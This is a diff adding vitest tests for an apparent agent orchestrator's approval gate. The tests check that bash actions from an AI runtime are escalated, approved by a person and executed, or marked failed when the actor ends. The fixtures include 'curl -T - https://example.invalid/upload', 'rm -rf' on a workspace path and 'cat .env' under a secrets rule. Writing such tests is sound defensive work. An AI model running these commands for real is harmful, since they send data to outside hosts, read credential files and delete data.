@@ -12,6 +12,7 @@ import { describe, expect, it } from "vitest";
 import {
   classifyBuilderTicketLoopResult,
   runDispatchedTurn,
+  terminalizeUndeliveredTurnApprovals,
   withAppGitLock,
 } from "../src/org/turn-runner.js";
 import type { LoopDriverResult } from "../src/loop/driver.js";
@@ -107,6 +108,122 @@ describe("dispatched builder terminal-refusal projection", () => {
 });
 
 describe("dispatched turn runner", () => {
+  it("delivers multiple approvals decided during one provider turn before terminalizing it", async () => {
+    const pair = makeBareWithClone();
+    const home = makeOrgHome({ approvals: true, state: true });
+    const app: AppEntry = {
+      name: "alpha",
+      repo: pair.bare.root,
+      status: "live",
+      budgetUsdMonth: 100,
+      cadence: {},
+    };
+    const appsFile: AppsFile = {
+      org: { name: "test", maxConcurrentTurns: 1 },
+      defaults: { budgetUsdMonth: 100 },
+      apps: [app],
+    };
+    const store = new ApprovalStore(home.root);
+    const actions = [
+      { tool: "bash", input: { command: "curl -T - https://example.invalid/upload" } },
+      { tool: "bash", input: { command: "rm -rf /workspace/disposable-cache" } },
+    ];
+    const runtime: Runtime = {
+      kind: "claude",
+      async runTurn(_request, hooks) {
+        for (const action of actions) {
+          expect(hooks.gate(action)).toMatchObject({ allow: false, escalate: true });
+        }
+        for (const pending of await store.listPending()) {
+          await store.decide(pending.id, { decision: "approved" });
+        }
+        return {
+          status: "completed",
+          summary: "provider completed after requesting two exact actions",
+          artifacts: [],
+          session: { runtime: "claude", id: "same-turn-approvals" },
+          usage: {
+            tokensIn: 10,
+            tokensOut: 5,
+            costUsd: 0.01,
+            subagentTurns: 0,
+            wallClockMs: 10,
+          },
+          escalations: [],
+        };
+      },
+    };
+    const calls: string[] = [];
+    try {
+      const result = await runDispatchedTurn({
+        role: ROLE,
+        app,
+        appsFile,
+        turnId: "live-approval-turn",
+        runtimeHome: home.root,
+        orgRoot: process.cwd(),
+        runtimeFor: () => runtime,
+        creatorScope: genericSupportScope(),
+        approvalCommandRunner: async ({ command }) => {
+          const item = (await store.listDecided()).find((candidate) =>
+            (candidate.action.input as { command?: string }).command === command);
+          expect(item?.execution).toMatchObject({ state: "executing", attempts: 1 });
+          calls.push(command);
+          return { exitCode: 0, stdout: "", stderr: "" };
+        },
+      });
+
+      expect([...calls].sort()).toEqual(actions.map((action) => action.input.command).sort());
+      expect(result.status).toBe("completed");
+      expect(result.summary).toContain("completed accepted plan v1");
+      const decided = (await store.listDecided())
+        .filter((item) => item.turnId === "live-approval-turn");
+      expect(decided).toHaveLength(2);
+      expect(decided.map((item) => item.execution?.state)).toEqual(["executed", "executed"]);
+      expect(decided.map((item) => item.execution?.attempts)).toEqual([1, 1]);
+    } finally {
+      home.cleanup();
+      pair.cleanup();
+    }
+  });
+
+  it("terminalizes an approved command when its actor ends before dispatch", async () => {
+    const home = makeOrgHome({ approvals: true });
+    const store = new ApprovalStore(home.root, { idSource: () => "actor-ended" });
+    try {
+      await store.raise({
+        app: "alpha",
+        role: "support",
+        turnId: "ended-turn",
+        rule: "secrets-or-auth",
+        action: { tool: "bash", input: { command: "cat .env" } },
+      });
+      await store.decide("actor-ended", { decision: "approved" });
+
+      expect(await terminalizeUndeliveredTurnApprovals(
+        store,
+        "alpha",
+        "ended-turn",
+        new Date("2026-07-24T01:30:00.000Z"),
+      )).toHaveLength(1);
+      expect((await store.show("actor-ended")).item.execution).toMatchObject({
+        state: "failed",
+        attempts: 1,
+        actor: "orchestrator/turn-finalizer/ended-turn",
+        failureCause: "actor_ended_before_dispatch",
+        nextAction: "retry_with_disposition",
+      });
+      expect(await terminalizeUndeliveredTurnApprovals(
+        store,
+        "alpha",
+        "ended-turn",
+        new Date("2026-07-24T01:31:00.000Z"),
+      )).toEqual([]);
+    } finally {
+      home.cleanup();
+    }
+  });
+
   it("stops before clone/runtime construction when an actor retry needs disposition", async () => {
     const home = makeOrgHome({ approvals: true, state: true });
     const app: AppEntry = {
